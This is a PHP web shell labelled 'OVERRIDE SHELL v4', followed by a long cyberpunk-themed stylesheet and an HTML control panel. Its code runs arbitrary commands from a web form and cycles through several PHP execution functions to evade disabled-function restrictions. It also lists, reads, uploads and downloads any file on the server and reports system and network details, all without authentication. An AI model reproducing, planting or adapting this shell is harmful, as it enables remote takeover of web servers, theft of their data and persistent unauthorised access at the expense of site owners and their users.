###########################################################
##### >>> C̠̫O͙͇D͓͇͕E͕̫̟D͙̻͔ B̡̫͔Y͍͇̪:̘͎̪: λrcangelo


<?php
error_reporting(0);
set_time_limit(0);

function isWindows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

// Alternative command execution methods
function executeCommand($cmd) {
    // Try multiple execution methods
    if (function_exists('shell_exec')) {
        return shell_exec($cmd);
    }
    elseif (function_exists('system')) {
        ob_start();
        system($cmd);
        return ob_get_clean();
    }
    elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd);
        return ob_get_clean();
    }
    elseif (function_exists('exec')) {
        exec($cmd, $output);
        return implode("\n", $output);
    }
    elseif (isWindows() && function_exists('popen')) {
        $handle = popen($cmd, 'r');
        $output = '';
        while (!feof($handle)) {
            $output .= fread($handle, 4096);
        }
        pclose($handle);
        return $output;
    }
    elseif (function_exists('proc_open')) {
        $descriptors = array(
            0 => array("pipe", "r"),
            1 => array("pipe", "w"),
            2 => array("pipe", "w")
        );
        $process = proc_open($cmd, $descriptors, $pipes);
        $output = '';
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        return $output;
    }
    // Fallback to backticks if nothing else works
    elseif (function_exists('`')) {
        return `$cmd`;
    }
    // Final fallback - create a temp file and use include
    else {
        $temp = tempnam(sys_get_temp_dir(), 'cmd');
        file_put_contents($temp, "<?php echo 'EXEC:'; passthru('$cmd'); ?>");
        ob_start();
        include $temp;
        unlink($temp);
        return ob_get_clean();
    }
}

function formatBytes($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    $bytes /= (1 << (10 * $pow));
    return round($bytes, 2) . ' ' . $units[$pow];
}

// Handle actions
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : '';
    
    switch ($action) {
        case 'list':
            $path = isset($_POST['path']) ? $_POST['path'] : '';
            if (is_dir($path)) {
                $files = scandir($path);
                echo "<h4>Contents of: " . htmlspecialchars($path) . "</h4><pre>";
                foreach ($files as $file) {
                    $fullpath = rtrim($path, '/\\') . DIRECTORY_SEPARATOR . $file;
                    $perms = substr(sprintf('%o', fileperms($fullpath)), -4);
                    $size = is_dir($fullpath) ? "DIR" : formatBytes(filesize($fullpath));
                    echo htmlspecialchars("$perms\t$size\t$file") . "\n";
                }
                echo "</pre>";
            } else {
                echo "<p>Directory not found or inaccessible</p>";
            }
            break;
            
        case 'read':
            $file = isset($_POST['file']) ? $_POST['file'] : '';
            if (is_file($file) && is_readable($file)) {
                echo "<h4>Contents of: " . htmlspecialchars($file) . "</h4><pre>";
                echo htmlspecialchars(file_get_contents($file));
                echo "</pre>";
            } else {
                echo "<p>File not found or unreadable</p>";
            }
            break;
            
        case 'cmd':
            $cmd = isset($_POST['command']) ? $_POST['command'] : '';
            echo "<h4>Command: " . htmlspecialchars($cmd) . "</h4><pre>";
            echo htmlspecialchars(executeCommand($cmd));
            echo "</pre>";
            break;
            
        case 'upload':
            if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] == UPLOAD_ERR_OK) {
                $target = isset($_POST['upload_path']) ? $_POST['upload_path'] : '';
                if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) {
                    echo "<p>File uploaded to: " . htmlspecialchars($target) . "</p>";
                } else {
                    // Try alternative upload method if move_uploaded_file fails
                    if (file_put_contents($target, file_get_contents($_FILES['upload_file']['tmp_name']))) {
                        echo "<p>File uploaded (alternative method) to: " . htmlspecialchars($target) . "</p>";
                    } else {
                        echo "<p>Upload failed</p>";
                    }
                }
            }
            break;
            
        case 'download':
            $file = isset($_POST['download_file']) ? $_POST['download_file'] : '';
            if (is_file($file) && is_readable($file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                header('Content-Length: ' . filesize($file));
                readfile($file);
                exit;
            }
            break;
            
        case 'info':
            echo "<h4>System Information</h4><pre>";
            echo "PHP Version: " . phpversion() . "\n";
            echo "OS: " . php_uname() . "\n";
            echo "Server Software: " . (isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'N/A') . "\n";
            echo "Current User: " . get_current_user() . "\n";
            echo "Disabled Functions: " . ini_get('disable_functions') . "\n";
            echo "Open Basedir: " . ini_get('open_basedir') . "\n";
            echo "</pre>";
            
            echo "<h4>Network Information</h4><pre>";
            if (isWindows()) {
                echo executeCommand('ipconfig /all');
            } else {
                echo executeCommand('ifconfig -a || ip a');
            }
            echo "</pre>";
            break;
    }
}
?>

<!DOCTYPE html>
<html>
<head>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Tektur:wght@400..900&display=swap" rel="stylesheet">
    <meta charset="UTF-8">
    <title>_</title>
    <style>

        body { font-family: "Tektur", sans-serif; margin: 20px; }
        pre { 
background: var(--color-bg--300);
  padding:
10px;
  overflow:
auto;
  border: 1px solid var(--color-primary--600);
 padding: 10px; overflow: auto; }
        .tab { display: none; }
        .tab.active { display: block; }
        .tab-button { padding: 10px; margin: 5px; cursor: pointer; background: #eee; border: none; }
        .tab-button.active { background: #ddd; font-weight: bold; }
        textarea, input[type="text"] { width: 80%; padding: 5px; margin: 5px; }
        button { padding: 5px 10px; margin: 5px; }


        body { font-family: "Tektur", sans-serif; margin: 20px; }
                pre { background: var(--color-bg--300); border: 1px solid var(--color-primary--600); padding: 10px; overflow: auto; }

        .tab { display: none; }
        .tab.active { display: block; }
        .tab-button { padding: 10px; margin: 5px; cursor: pointer; background: #eee; border: none; }
        .tab-button.active { background: #ddd; font-weight: bold; }
        textarea, input[type="text"] { width: 80%; /*! padding: 5px; */ /*! margin: 5px; */ color: red;/*! background: transparent; *//*! border: 0; */}
        button { padding: 5px 10px; margin: 5px; }
    
      

body {
  --color-bg--300: #1e181ef0;
  --color-bg--500: #191a1e;
  --color-primary--500: #e8615a;
  --color-primary--600: #9c3230;
  --color-primary-black: #0e0e18;
  --color-primary-red: #710000;
  --color-primary-yellow: #fdf500;
  --color-primary-green: #1ac5b0;
  --color-primary-blue: #37ebf3;
  --color-primary-purple: #930DB;
  --color-primary-pink1: #e455ae;
  --color-primary-pink2: #cb1dcd;
  --color-primary-silver: #d1c5c0;
  --color-secondary-blue: #37ebf360;
  --font-primary: "Rajdhani", sans-serif;
  --font-secondary: "VT323", monospace;
  --color-green: #1ac5b0;
  --ui-glow: 0 0 5px var(--color-primary--500);
  --ui-glow-borders--500: 0 0 3px var(--color-primary--500);
  --ui-glow-color: currentcolor;
  --ui-glow-text: -9px -6px 40px var(--ui-glow-color);
  --ui-glow-text--dimmed: -9px -6px 40px var(--ui-glow-color);
  --ui-elevation--1: 2px 2px 0 rgba(0, 0, 0, 0.8);
  --ui-notch-amount: 1rem;
  --ui-notch-hypotenuse: 22.627416px; /* hypothenuse of --ui-notch-amount */
  --ui-notch-path: polygon(
    0 0,
    100% 0,
    100% calc(100% - var(--ui-notch-amount) + 2px),
    calc(100% - var(--ui-notch-amount) + 2px) 100%,
    0 100%
  );
  --ui-notch-path-r: polygon(
    100% 0,
    100% 100%,
    calc(var(--ui-notch-amount) - 2px) 100%,
    0 calc(100% - var(--ui-notch-amount) + 2px),
    0 0
  );
  font-family: var(--font-primary);
  color: var(--color-primary--500);
  background-color: var(--color-bg--500);
  background-image: radial-gradient(
    ellipse at 33% 10%,
    #461616 0%,
    transparent 75%
  );
  background-repeat: no-repeat;
  margin: 0;
}

hr{ 
      color: var(--color-primary--700);
    box-shadow: 0 0 16px 2px var(--color-primary--500);
}
body:before {
  content: " ";
  display: block;
  position: absolute;
  left: 0;
  top: 0;
  width: 100%;
  height: 100%;
  opacity: 0.2;
  background-repeat: no-repeat;
  background-position: 50% 0;
  background-size: cover;
}
#app {
}
.green {
  color: var(--color-primary-green);
}
.red {
  color: var(--color-primary--500);
}
svg {
  fill: currentcolor;
}
.text-glow {
  font-family: var(--font-secondary);
  color: var(--color-primary--500);
  letter-spacing: 0.035rem;
  text-shadow: var(--ui-glow-text);
  text-transform: uppercase;
}
header {
  font-family: var(--font-secondary);
  color: var(--color-primary-yellow);
  letter-spacing: 0.035rem;
  text-shadow: var(--ui-glow-text);
  text-transform: uppercase;
}
h3 {
}
header small {
  color: var(--color-primary-silver);
}
.delimiter {
  background-color: var(--color-primary--500);
  box-shadow: var(--ui-glow);
  bottom: 0;
  content: "";
  height: 2px;
  left: 0;
  width: 100%;
}
.delimiter2 {
  background-color: var(--color-primary--500);
  box-shadow: var(--ui-glow);
  bottom: 0;
  content: "";
  height: 1px;
  left: 0;
  width: 100%;
}
.delimiter-blue {
  background-color: var(--color-primary-blue);
  box-shadow: var(--ui-glow);
  bottom: 0;
  content: "";
  height: 1px;
  left: 0;
  width: 100%;
}


.cb2::file-selector-button {
  visibilty: hidden;
  color: red;
  background: transparent;
  border: 0;
  content: ;
  content: "";
  appearance: none;
  -webkit-appearance: none;
  -moz-appearance: none;
  opacity: 0;
  width: 2px;
  height: 31px;
  padding-left: 10px;
}


.status {
  height: 8px;
  width: 8px;
  background-color: var(--color-primary-silver);
  border-radius: 50%;
  display: inline-block;
}
.status.green {
  background-color: var(--color-primary-green);
}
.status.red {
  background-color: var(--color-primary--500);
}
.silver {
  color: var(--color-primary-silver);
}
.clock {
  color: var(--color-primary-silver);
}
#vue-trading-view {
  height: 600px;
} .search {
    color: var(--color-primary--700);
padding-left: 25px;
}
.search,textarea, input[type="text"] {
color: var(--color-primary--700);
}
.cb {
  position: relative;
  height: 4vh;
font-family: "Tektur", sans-serif;
width: 70%;
  background-color: var(--color-bg--300);
  border: 1px solid var(--color-primary--600);
  -webkit-clip-path: var(--ui-notch-path);
  clip-path: var(--ui-notch-path);
}
.cb::before {
  background-color: var(--color-primary--600);
  bottom: 5px;
  content: "";
  display: block;
  height: 3px;
  position: absolute;
  right: -6px;
  top: auto;
  transform: rotate(-45deg);
  width: var(--ui-notch-hypotenuse);
  z-index: 100;
}
.cb-reverse {
  clip-path: var(--ui-notch-path-r);
}
.cb-reverse::before {
  transform: rotate(45deg);
  left: -6px;
}
.cb2 {
font-family: "Tektur", sans-serif;
    color:   color: var(--color-primary--600);
    width: 10%;
    height: 35px;
  position: relative;
  background-color: var(--color-bg--200);
  border: 1px solid var(--color-primary--600);
  -webkit-clip-path: var(--ui-notch-path);
  clip-path: var(--ui-notch-path);
  padding-right: 0.5rem;
}
.cb2:hover,
.cb2:hover + .bar,
.cb2.active,
.cb2.active::before {
  border: 1px solid var(--color-primary-blue);
  color: var(--color-primary-blue);
  background-color: var(--color-secondary-blue);
}
.cb2::before {
  background-color: var(--color-primary--600);
  bottom: 3px;
  content: "";
  display: block;
  height: 3px;
  position: absolute;
  right: -6px;
  top: auto;
  transform: rotate(-45deg);
  width: var(--ui-notch-hypotenuse);
  z-index: 100;
}
.cb_tab {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  height: 50px;
  min-width: 250px;
  text-transform: uppercase;
  letter-spacing: 0.035rem;
  text-shadow: var(--ui-glow-text);
  color: var(--color-primary--500);
  background-color: var(--color-primary--600);
  cursor: pointer;
  border: 0;
  outline: none;
  clip-path: polygon(
    4rem 0,
    4.5rem 0.25rem,
    100% 0.25rem,
    100% calc(100% - var(--ui-notch-amount) + 2px),
    calc(100% - var(--ui-notch-amount) + 2px) 100%,
    0 100%,
    0 0
  );
}
.cb_tab:hover,
.cb_tab.active {
  color: var(--color-primary-blue);
}
.cb_tab div {
  position: absolute;
  padding-top: 5px;
  top: 0.1rem;
  left: 0.1rem;
  right: 0.1rem;
  bottom: 0.1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  background-color: var(--color-bg--300);
  clip-path: polygon(
    4rem 0,
    4.5rem 0.25rem,
    100% 0.25rem,
    100% calc(100% - var(--ui-notch-amount) + 2px),
    calc(100% - var(--ui-notch-amount) + 2px) 100%,
    0 100%,
    0 0
  );
}
.cb-left {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  min-width: 35px;
  text-transform: uppercase;
  letter-spacing: 0.035rem;
  background-color: #8921259c;
  cursor: pointer;
  border: 0;
  outline: none;
  clip-path: polygon(
    20px 5px,
    25px 0,
    100% 0,
    100% 50px,
    calc(100% - 3px) 50px,
    calc(100% - 3px) calc(100% - 50px),
    100% calc(100% - 50px),
    100% 100%,
    1rem 100%,
    0 calc(100% - var(--ui-notch-amount) + 2px),
    0 5px
  );
}
.cb-left div {
  position: absolute;
  padding-top: 5px;
  top: 0.1rem;
  left: 0.1rem;
  right: 0.1rem;
  bottom: 0.1rem;
  display: flex;
  align-items: center;
  justify-content: center;
  background-color: #441618;
  clip-path: polygon(
    20px 5px,
    25px 0,
    100% 0,
    100% 50px,
    calc(100% - 3px) 50px,
    calc(100% - 3px) calc(100% - 50px),
    100% calc(100% - 50px),
    100% 100%,
    1rem 100%,
    0 calc(100% - var(--ui-notch-amount) + 2px),
    0 5px
  );
}

.cb-left div:after {
  content: "";
  display: block;
  width: 20px;
  height: 5px;
  position: absolute;
  z-index: 99;
  left: 0px;
  background-color: transparent;
  border: 1px solid #892125;
}
.cb-style3 {
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 20px;
  /*min-width: 250px;*/
  height: 50px;
  text-transform: uppercase;
  letter-spacing: 0.035rem;
  background-color: #892125;
  cursor: pointer;
  border: 0;
  outline: none;
  clip-path: var(--ui-notch-path);
}
.cb-style3::before {
  content: "";
  display: block;
  position: absolute;
  z-inde: -1;
  top: 1px;
  left: 1px;
  right: 1px;
  bottom: 1px;
  display: flex;
  align-items: center;
  justify-content: center;
  background-color: #441618;
  clip-path: var(--ui-notch-path);
}
.cb-style3::after {
  content: "";
  display: block;
  width: 20px;
  height: 5px;
  position: absolute;
  left: 2px;
  background-color: transparent;
  border: 1px solid #892125;
}
.cb-style3:hover {
  border: 1px solid var(--color-primary-blue);
  color: var(--color-primary-blue);
  background-color: var(--color-primary-blue);
  z-index: 10;
}
.cb-style3-left {
  clip-path: var(--ui-notch-path-r);
}
.cb-style3-left::before {
  clip-path: var(--ui-notch-path-r);
}
.cb-style3-left::after {
  right: 0;
  transform: translateX(227px);
}
.cb-style3-left:hover::after {
  border: 1px solid var(--color-primary-blue);
}

.tickers .header,
.trades .header,s
.orders .header {
  color: var(--color-primary-blue);
}

.dotdotdot {
  text-overflow: ellipsis;
  white-space: nowrap;
  overflow: hidden;
}

.orders .header > div,
.orders .body > div {
  flex: 1;
}
.overflow-y-scroll::-webkit-scrollbar {
  background: transparent;
  width: 5px;
}

.overflow-y-scroll::-webkit-scrollbar-thumb {
  background-color: var(--color-primary--500);
}

/* we will explain what these classes do next! */
.v-enter-active,
.v-leave-active {
  opacity: 0;
  transition: opacity 0.5s ease;
}

.v-enter-from,
.v-leave-to {
  opacity: 0;
  transition: opacity 0.5s ease;
}
        * {
            box-sizing: border-box;
            position: relative;
            /*! width: 100vw; */
            /*! height: 100vh; */
            /*! height: 50%; */
        }

        html, body {
           --color-bg--300: #1e181ef0;
  --color-bg--500: #191a1e;
  --color-primary--500: #e8615a;
  --color-primary--600: #9c3230;
  --color-primary-black: #0e0e18;
  --color-primary-red: #710000;
  --color-primary-yellow: #fdf500;
  --color-primary-green: #1ac5b0;
  --color-primary-blue: #37ebf3;
  --color-primary-purple: #930DB;
  --color-primary-pink1: #e455ae;
  --color-primary-pink2: #cb1dcd;
  --color-primary-silver: #d1c5c0;
  --color-secondary-blue: #37ebf360;
  --font-primary: "Rajdhani", sans-serif;
  --font-secondary: "VT323", monospace;
  --color-green: #1ac5b0;
  --ui-glow: 0 0 5px var(--color-primary--500);
  --ui-glow-borders--500: 0 0 3px var(--color-primary--500);
  --ui-glow-color: currentcolor;
  --ui-glow-text: -9px -6px 40px var(--ui-glow-color);
  --ui-glow-text--dimmed: -9px -6px 40px var(--ui-glow-color);
  --ui-elevation--1: 2px 2px 0 rgba(0, 0, 0, 0.8);
  --ui-notch-amount: 1rem;
  --ui-notch-hypotenuse: 22.627416px; /* hypothenuse of --ui-notch-amount */
  --ui-notch-path: polygon(
    0 0,
    100% 0,
    100% calc(100% - var(--ui-notch-amount) + 2px),
    calc(100% - var(--ui-notch-amount) + 2px) 100%,
    0 100%
  );
  --ui-notch-path-r: polygon(
    100% 0,
    100% 100%,
    calc(var(--ui-notch-amount) - 2px) 100%,
    0 calc(100% - var(--ui-notch-amount) + 2px),
    0 0
  );
  font-family: var(--font-primary);
  color: var(--color-primary--500);
  background-color: var(--color-bg--500);
  background-image: radial-gradient(
    ellipse at 33% 10%,
    #461616 0%,
    transparent 75%
  );
  background-repeat: no-repeat;
  margin: 0;
        }

        a {
            color: inherit;
            text-decoration: none;
        }

        .form-container {
            padding: 1rem;
            margin: 1rem;
          
            background-color: var(--colors-bg--300);
            border: 1px solid var(--colors-primary--500);
            box-shadow: var(--ui-glow-borders--500);
        }

        .form-label {
            background-color: var(--colors-primary--600);
            color: var(--colors-on_primary--500);
            font-family: var(--fonts-secondary);
            font-size: 0.92rem;
            display: inline-block;
            padding: 0.125em 0.75em;
            text-transform: uppercase;
            vertical-align: bottom;
            clip-path: polygon(0.25em 0, calc(100% - 1em) 0, 100% 100%, 0.33em 100%, 0 100%, 0 0.25em);
        }

        .form-control {
            background-color: var(--colors-bg--300);
            border: 1px solid var(--colors-primary--600);
            padding: 0.5rem;
            width: 100%;
            font-family: var(--fonts-primary);
            font-size: 1rem;
            color: var(--colors-primary--500);
            box-shadow: none;
        }
.bar {
      content: "";
  position: absolute;
  bottom: 14px;
  left: 9%;
  width: 19px; /* Length of diagonal - tweak if needed */
  height: 1.2px; /* Thickness of border line */
  background-color: var(--color-primary--600); /* Border color */
  transform: rotate(-45deg);
  transform-origin: bottom right;
  z-index: 2;
  pointer-events: none;
}
        .button {
            background-color: transparent;
            border: 1px solid var(--colors-primary--500);
            cursor: pointer;
            color: var(--colors-primary--500);
            display: inline-block;
            font-family: var(--fonts-primary);
            padding: 0.45rem;
            text-align: left;
            text-transform: uppercase;
            box-shadow: var(--ui-glow);
        }

        .button:hover {
            background-color: var(--colors-primary--800);
            color: var(--colors-on_primary--500);
        }

        .button-toolbar {
            display: flex;
            gap: 1rem;
        }
    

@keyframes flicker {
  0%, 18%, 22%, 25%, 53%, 57%, 100% {
    opacity: 1;
    text-shadow:
      0 0 2px #ff0000,
      0 0 5px #ff0000,
      0 0 10px #ff0000;
  }
  20%, 24%, 55% {
    opacity: 0.4;
    text-shadow: none;
  }
}

@keyframes glitch {
  0%, 100% {
    transform: skewX(0deg);
  }
  20%, 80% {
    transform: skewX(5deg);
  }
  40%, 60% {
    transform: skewX(-5deg);
  }
}
.glitch-text {
    font-family: "Tektur", sans-serif;
  color: #ff0000;
  font-size: 2.5rem;
  position: relative;
  animation: flicker 2s infinite;
  text-shadow:
    0 0 2px #ff0000,
    0 0 5px #ff0000,
    0 0 10px #ff0000,
    0 0 20px #ff0033,
    0 0 30px #ff0033,
    0 0 40px #ff3366,
    0 0 50px #ff3366;
  mix-blend-mode: screen;
}

/* Glitch effect layers */
.glitch-text::before,
.glitch-text::after {
  content: attr(data-text);
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  color: #ff0000;
  background: black;
  overflow: hidden;
  clip-path: inset(0 0 0 0);
  animation: glitch 1s infinite;
}

.glitch-text::before {
  left: 2px;
  text-shadow: -2px 0 #0ff;
  animation-delay: 0.1s;
}

.glitch-text::after {
  left: -2px;
  text-shadow: -2px 0 #f0f;
  animation-delay: 0.2s;
}


    </style>
    <script>
        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.querySelectorAll('.tab-button').forEach(btn => {
                btn.classList.remove('active');
            });
            document.getElementById(tabName).classList.add('active');
            event.currentTarget.classList.add('active');
        }
    </script>
</head>
<body>
    <h2 class="glitch-text">𐊖𝖺𝔪𝖺𝖾ɭ ΘVERRIDΞ SHΞLL v4 </h2>
    
    <div>
        <button class="tab-button cb2 active" onclick="showTab('file')">File Operations</button>
        <button class="tab-button cb2" onclick="showTab('cmd')">Command Execution</button>
        <button class="tab-button cb2" onclick="showTab('upload')">File Upload</button>
        <button class="tab-button cb2" onclick="showTab('download')">File Download</button>
        <button class="tab-button cb2" onclick="showTab('info')">System Info</button>
    </div>
    
    <div id="file" class="tab active">
        <h3>File Operations</h3>
        <form method="POST">
            <input type="hidden" name="action" value="list">
            <input type="text" class="cb search" name="path" placeholder="Directory path (e.g. C:\Windows\)" size="50">
            <button class="cb2" type="submit">List Directory</button>
        </form>
        
        <form method="POST">
           
            <input type="hidden" name="action" value="read">
            <input type="text" class="cb search" name="file" placeholder="File path to read" size="50">
            <button class="cb2" type="submit">Read File</button>
        </form>
    </div>
    
    <div id="cmd" class="tab">
        <h3>Command Execution</h3>
        <form method="POST">
            <input type="hidden" name="action" value="cmd">
            <input type="text" class="cb search" name="command" placeholder="Command to execute" size="50">
            <button class="cb2" type="submit">Execute</button>
        </form>
    </div>
    
    <div id="upload" class="tab">
        <h3>File Upload</h3>
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" class="cb2" name="upload_file">
            <input type="text" class="cb search " name="upload_path" placeholder="Destination path" size="50">
            <button class="cb2" type="submit">Upload</button>
        </form>
    </div>
    
    <div id="download" class="tab">
        <h3>File Download</h3>
        <form method="POST">
            <input type="hidden" name="action" value="download">
            <input type="text" class="cb search" name="download_file" placeholder="File path to download" size="50">
            <button class="cb2" type="submit">Download</button>
        </form>
    </div>
    
    <div id="info" class="tab">
        <h3>System Information</h3>
        <form method="POST">
            <input type="hidden" name="action" value="info">
            <button class="cb2" type="submit">Get System Info</button>
        </form>
    </div>
</body>
</html>